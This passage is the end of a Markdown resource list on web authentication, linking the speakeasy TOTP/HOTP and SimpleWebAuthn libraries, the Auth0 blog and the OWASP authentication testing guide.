- [speakeasy](https://github.com/speakeasyjs/speakeasy) - TOTP/HOTP
- [@simplewebauthn/server](https://simplewebauthn.dev/) - WebAuthn

**Learning Resources:**
- [Auth0 Blog](https://auth0.com/blog/)
- [OWASP Authentication Guide](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/README)
